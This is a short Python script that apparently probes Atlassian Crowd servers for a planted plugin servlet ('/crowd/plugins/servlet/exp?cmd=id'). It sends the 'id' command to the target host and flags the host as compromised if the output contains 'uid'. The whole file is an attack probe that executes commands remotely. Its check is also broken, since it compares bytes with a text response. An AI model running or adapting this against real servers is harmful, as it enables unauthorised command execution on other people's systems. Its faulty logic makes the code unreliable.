#encoding:utf-8
try:
    import requests,os,logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)
def check(ip,port):
    try:
        target = "http://"+ip+":" +port+ "/crowd/plugins/servlet/exp?cmd=id"
        reg = requests.get(target,timeout=3)
        if b'uid' in reg.text:
            print("[+] {} find arlassian unauthorized".format(ip))
            os._exit(1)
        else:
            logging.info("[-] do not found ")
            os._exit(2)
        # print(reg.text.encode("utf-8"))
    except Exception as e:
        logging.info("[*] {}" .format(e))
        os._exit(4)
if __name__ == "__main__":
    import sys
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
